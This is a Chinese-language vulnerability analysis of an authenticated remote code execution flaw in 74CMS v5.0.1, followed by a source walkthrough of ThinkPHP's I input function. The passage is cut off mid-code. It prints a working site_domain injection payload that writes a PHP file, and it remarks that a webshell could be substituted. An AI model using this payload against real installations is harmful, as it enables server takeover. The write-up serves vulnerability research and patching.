## 文章前言
当笔者第一次看到这个漏洞时，感觉这个漏洞挺鸡肋的，因为需要登录后台管理账户才可以实现RCE，但后期发现这个漏洞的思路挺不错，该漏洞从一个简简单单的网站域名设置到写入恶意代码到url文件，之后再到访问url文件导致恶意代码被执行，最后实现getshell，整个漏洞挖掘思路很是别出心裁，同时也算是给自己了一个警醒——"小功能点"不容小视，下面对该漏洞进行一个简易分析
## 影响范围
74CMS_v5.0.1
## 利用条件
登陆后台
## 漏洞复现
### 环境搭建
前往74CMS官网下载v5.0.1版本系统安装包：  
之后在本地使用PHPstudy来搭建环境：  
### 漏洞利用
首先使用管理员账号登陆后台，点击保存网络配置并使用burpsuite抓包：  
之后修改site_domain如下：  
 ——base64之后————> PD9waHAgcGhwaW5mbygpOz8+  
payload：
    site_domain=', file_put_contents('403.php',base64_decode('PD9waHAgcGhwaW5mbygpOz8%2b')),'
之后再请求一次:/74cms/Application/Common/Conf/url.php使得其中的恶意PHP代码被执行：  
之后成功写入403.php文件，文件内容如下所示：  
之后访问：  
在实战中修改文件内容为一句话木马即可成功getshell，这里不再赘述~
## 漏洞分析
### I函数简介
新版本的74CMS底层使用TP进行了重构，而该漏洞又涉及到I函数，所以我们这里先来介绍一下TP中的I函数，I函数的作用是获取系统变量，必要时还可以对变量值进行过滤及强制转化，I函数的语法格式：
    I('变量类型.变量名/修饰符',['默认值'],['过滤方法或正则'],['额外数据源'])
#### 获取变量
在PHP中获取变量值的方法有很多，比如：$_GET['变量名']，$_POST['变量名']，$_SESSION['变量名']，$_COOKIE['变量名']，$SERVER['变量名']
都可以获取相应的变量值，但在TP中为了安全的原因建议统一使用 I
函数来获取变量值，例如：获取URL地址栏中参数id的值，在php中我们用$_GET['id']
来获取，在thinkphp中我们可以用I('get.id')来获取，同样，$_POST['id'] 就用 I('post.id')
取代，I函数的语法格式中的变量类型就是指的像get和post之类的请求方式，类似的变量类型还包括：  
如果要获取的变量类型是get、post或put，可以统一用param变量类型，param变量类型是框架特有的支持自动判断当前请求类型的变量获取方式，例如：I('param.id')
，如果当前请求类型是GET，那么等效于$_GET['id']，如果当前请求类型是POST或者PUT，那么相当于获取$_POST['id']
或者PUT参数id。而事实上当 I 函数获取的变量类型是param时变量类型可以省略直接写为：I('变量名') ，那么
$_GET['id']、$_POST['id'] 都可以简写为：I('id') ，但当变量类型为其他类型时就不能这么简写，比如
I('cookie.id')、I('session.id')就不能简写。  
注意：I 函数的变量类型不区分大小写，但变量名严格区分大小写，比如 I('get.id') 可以写成 I('GET.id')，但不能写成
I('get.ID')
#### 变量过滤
I函数本身默认的过滤机制是htmlspecialchars，因为在配置文件中配置了：
    // 系统默认的变量过滤机制
    'DEFAULT_FILTER'        =>  'htmlspecialchars',
所以I('post.变量名')
就等同于htmlspecialchars($_POST('变量名'))，如果I函数自身带了过滤方法，则用自身带的过滤机制过滤变量，比如：
    I('post.email','请输入正确的email地址',FILTER_VALIDATE_EMAIL);
表示会对$_POST['email'] 进行格式验证判断是否符合email 的格式要求，如果不符合的话，返回提示信息，上面的代码也可以简化：
    I('post.email','请输入正确的email地址','email')
上面的 FILTER_VALIDATE_EMAIL是不带引号的，下面的email 是带引号的，像上面 email那样简写的过滤方法名必须是
filter_list方法中的有效值（不同的服务器环境可能有所不同），可能支持的包括：
  * int
  * boolean
  * float
  * validate_regexp
  * validate_url
  * validate_email
  * validate_ip
  * string
  * stripped
  * encoded
  * special_chars
  * unsafe_raw
  * email
  * url
  * number_int
  * number_float
  * magic_quotes
  * callback
#### 变量修饰符
变量修饰符和变量名称之间用“/”分割开来，变量修饰符的作用是强制转化变量的字符类型，比如：
    I('get.id/d'); // 强制变量转换为整型
    I('post.name/s'); // 强制转换变量为字符串类型
    I('post.ids/a'); // 强制变量转换为数组类型
可以使用的修饰符包括：
### 源码分析
下面我们对此漏洞进行分析，这里我们采用正向跟踪分析的方式进行分析，首先，我们根据POC请求包中的URL来对漏洞文件进行定位：  
URL地址：/74cms/index.php?m=Admin&c=config&a=edit  
URL简化：Controller=config&action=edit  
文件定位：/Application/Admin/Controller/ConfigController.class.php  
函数代码：
    public function edit(){
            if(IS_POST){
                $site_domain = I('request.site_domain','','trim');
                $site_domain = trim($site_domain,'/');
                $site_dir = I('request.site_dir',C('qscms_site_dir'),'trim');
                $site_dir = $site_dir==''?'/':$site_dir;
                $site_dir = $site_dir=='/'?$site_dir:('/'.trim($site_dir,'/').'/');
                $_POST['site_dir'] = $site_dir;
                if($site_domain && $site_domain != C('qscms_site_domain')){
                    if($site_domain == C('qscms_wap_domain')){
                        $this->returnMsg(0,'主域名不能与触屏版域名重复！');
                    }
                    $str = str_replace('http://','',$site_domain);
                    $str = str_replace('https://','',$str);
                    if(preg_match('/com.cn|net.cn|gov.cn|org.cn$/',$str) === 1){
                        $domain = array_slice(explode('.', $str), -3, 3);
                    }else{
                        $domain = array_slice(explode('.', $str), -2, 2);
                    }
                    $domain = '.'.implode('.',$domain);
                    $config['SESSION_OPTIONS'] = array('domain'=>$domain);
                    $config['COOKIE_DOMAIN'] = $domain;
                    $this->update_config($config,CONF_PATH.'url.php');
                }
                $logo_home = I('request.logo_home','','trim');
                if(strpos($logo_home,'..')!==false){
                    $_POST['logo_home'] = '';
                }
                // $logo_user = I('request.logo_user','','trim');
                // if(strpos($logo_user,'..')!==false){
                //     $_POST['logo_user'] = '';
                // }
                $logo_other = I('request.logo_other','','trim');
                if(strpos($logo_other,'..')!==false){
                    $_POST['logo_other'] = '';
                }
                if($default_district = I('post.default_district',0,'intval')){
                    $city = get_city_info($default_district);
                    $_POST['default_district'] = $city['district'];
                    $_POST['default_district_spell'] = $city['district_spell'];
                    /*选中最后一级，默认选择上一级
                    $s = D('CategoryDistrict')->get_district_cache($default_district);
                    $city = get_city_info($default_district);
                    if(!$s){
                        $citycategory = explode('.',$city['district']);
                        if(2 _edit();
            $this->display();
        }
可以看到此处传递进来的site_domain参数会首先经过I函数进行一次输入过滤，I函数的过滤如下所示(部分已注释，可借鉴之前的介绍)：  
ThinkPHP\Common\functions.php
    /**
     * 获取输入参数 支持过滤和默认值
     * 使用方法:
     * 
     * I('id',0); 获取id参数 自动判断get或者post
     * I('post.name','','htmlspecialchars'); 获取$_POST['name']
     * I('get.'); 获取$_GET
     * 
     * @param string $name 变量的名称 支持指定类型
     * @param mixed $default 不存在的时候默认值
     * @param mixed $filter 参数过滤方法
     * @param mixed $datas 要获取的额外数据源
     * @return mixed
     */
    function I($name,$default='',$filter=null,$datas=null) {
        static $_PUT    =   null;
        if(strpos($name,'/')){ // 指定修饰符
            list($name,$type)   =   explode('/',$name,2);
        }elseif(C('VAR_AUTO_STRING')){ // 默认强制转换为字符串
            $type   =   's';
        }
        if(strpos($name,'.')) { // 指定参数来源
            list($method,$name) =   explode('.',$name,2);
        }else{ // 默认为自动判断
            $method =   'param';
        }
        switch(strtolower($method)) {
            case 'get'     :   
                $input =& $_GET;
                break;
            case 'post'    :   
                $input =& $_POST;
                break;
            case 'put'     :   
                if(is_null($_PUT)){
                    parse_str(file_get_contents('php://input'), $_PUT);
                }
                $input  =   $_PUT;        
                break;
            case 'param'   :
                switch($_SERVER['REQUEST_METHOD']) {
                    case 'POST':
                        $input  =  $_POST;
                        break;
                    case 'PUT':
                        if(is_null($_PUT)){
                            parse_str(file_get_contents('php://input'), $_PUT);
                        }
                        $input  =   $_PUT;
                        break;
                    default:
                        $input  =  $_GET;
                }
                break;
            case 'path'    :   
                $input  =   array();
                if(!empty($_SERVER['PATH_INFO'])){
                    $depr   =   C('URL_PATHINFO_DEPR');
                    $input  =   explode($depr,trim($_SERVER['PATH_INFO'],$depr));            
                }
                break;
            case 'request' :   
                $input =& $_REQUEST;   
                break;
            case 'session' :   
                $input =& $_SESSION;   
                break;
            case 'cookie'  :   
                $input =& $_COOKIE;    
                break;
            case 'server'  :   
                $input =& $_SERVER;    
                break;
            case 'globals' :   